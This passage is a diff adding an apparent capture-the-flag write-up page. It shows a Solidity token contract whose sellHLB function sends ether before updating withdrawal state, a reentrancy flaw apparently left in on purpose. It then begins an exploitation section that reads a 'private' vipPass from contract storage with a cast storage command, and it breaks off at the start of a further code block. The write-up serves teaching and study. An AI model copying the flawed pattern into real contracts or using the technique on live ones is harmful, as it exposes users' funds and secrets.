+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">address&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">this&lt;/span>&lt;span class="p">)]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">address&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">this&lt;/span>&lt;span class="p">)].&lt;/span>&lt;span class="n">sub&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">value&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// sellHLB to sell HLB token. We can sell token once per year.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">function&lt;/span> &lt;span class="nf">sellHLB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Check if we have enough token to sell
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Check the last time we sold HLB
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">block&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">timestamp&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="n">lastWithdrawTime&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">365&lt;/span> &lt;span class="kc">days&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Vous devez attendre un an entre chaque retrait.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Call the function transfer below to update the balance of the receiver and the sender.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nb">transfer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">this&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Update the seniroty of the user. The seniority is used to get the vip pass.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">seniority&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">seniority&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">365&lt;/span> &lt;span class="kc">days&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Send ether to the remote address. The fallback function is used to send ether to the contract.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">bool&lt;/span> &lt;span class="n">sent&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">call&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nb">value&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">}(&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sent&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Erreur lors de l&amp;#39;envoi de l&amp;#39;ethereum.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Update the last time we sold HLB. This is used to check if we can sell HLB again.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">lastWithdrawTime&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">block&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">timestamp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">transfer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">receiver&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">override&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">bool&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">numTokens&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">sub&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">numTokens&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">receiver&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">receiver&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">numTokens&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">emit&lt;/span> &lt;span class="n">Transfer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">receiver&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">approve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">delegate&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">override&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">bool&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">allowed&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">delegate&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">emit&lt;/span> &lt;span class="n">Approval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">delegate&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">reset&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span> &lt;span class="k">memory&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">seniority&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lastWithdrawTime&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;Pas d&amp;#39;argent pour les impatients !&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">allowance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">owner&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">address&lt;/span> &lt;span class="n">delegate&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">override&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">allowed&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">owner&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">delegate&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">transferFrom&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">owner&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">address&lt;/span> &lt;span class="n">buyer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">override&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">bool&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">numTokens&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">owner&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">numTokens&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">allowed&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">owner&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">owner&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">owner&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">sub&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">numTokens&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">allowed&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">owner&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">allowed&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">owner&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">sub&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">numTokens&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">buyer&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">buyer&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">numTokens&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">emit&lt;/span> &lt;span class="n">Transfer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">owner&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buyer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// senior function to get the vip pass.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">function&lt;/span> &lt;span class="nf">senior&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">seniority&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">365&lt;/span> &lt;span class="kc">days&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Revenez dans quelque temps.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">seniority&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">150&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">365&lt;/span> &lt;span class="kc">days&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Vous vous faites vieux, laissez-nous la place.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">vipPass&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fallback&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">payable&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">revert&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">modifier&lt;/span> &lt;span class="nf">onlyOwner&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">boss&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">_&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// SafeMath to avoid integer underflow or overflow
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kd">library&lt;/span> &lt;span class="n">SafeMath&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">sub&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">internal&lt;/span> &lt;span class="k">pure&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">assert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">b&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">a&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">internal&lt;/span> &lt;span class="k">pure&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">assert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Comment has been added on the function that will be exploited.&lt;/p>
+&lt;h1 id="exploitation">Exploitation&lt;/h1>
+&lt;h2 id="vippass">VipPass&lt;/h2>
+&lt;p>By seeing this contract, the goal was pretty clear. We want to get the vip pass. One thing that should never be forgotten in solidity:&lt;/p>
+&lt;blockquote>
+&lt;p>Nothing is private in smart contracts!&lt;/p>
+&lt;/blockquote>
+&lt;p>The public variable can be accessed easly with call instruction. In other hand, the private variable can be accessed only with the function rpc function &lt;code>eth_getStorageAt&lt;/code> (the name may be different depending of the client). The slot storage are explains in depth in &lt;a class="link" href="https://docs.soliditylang.org/en/v0.8.7/internals/layout_in_storage.html" target="_blank" rel="noopener"
+>soliditylang&lt;/a>.&lt;/p>
+&lt;p>Basically, compare to other types, uint256 is easy to understand. Its position slot is the position of the declared variable (note that the mapping does not count). In our case &lt;code>uint256 private vipPass;&lt;/code> is at position &lt;strong>4&lt;/strong>, the variable &lt;code>boss&lt;/code> (the owner of the contract) is at position &lt;strong>5&lt;/strong>.&lt;/p>
+&lt;p>To access the variable &lt;code>vipPass&lt;/code>, we will use cast from the foundry binaries:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ &lt;span class="c1"># cast storage &amp;lt;contract address&amp;gt; &amp;lt;slot number&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ cast storage 0xD5c0873f147cECF336fEEF1a28474716C745Df86 &lt;span class="m">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x54be6df4fa514940682be41f9a5a04ecc45bb46877adcd1fa4db82c08d1bd080
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The function &lt;code>senior()&lt;/code> returns the vipPass as an &lt;code>uint256&lt;/code> value. The &lt;code>cast storage&lt;/code> command returns the value as a hexadecimal string. We can either use an &lt;a class="link" href="https://www.rapidtables.com/convert/number/hex-to-decimal.html" target="_blank" rel="noopener"
+>online converter&lt;/a> or solidity (with foundry dependencies).&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
